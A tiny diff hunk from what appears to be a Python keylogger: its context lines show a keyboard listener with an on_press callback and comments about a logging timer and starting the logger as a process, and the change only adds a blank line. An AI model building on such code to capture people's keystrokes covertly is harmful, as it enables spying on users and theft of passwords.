@@ -44,6 +44,7 @@ if (open(direct[0]).read()) \
             with Listener(on_press=on_press) as listener:
                 listener.join()
 
+                
         # Timer to stop logging sequence
         if __name__ == '__main__':
             # Start logger as a process
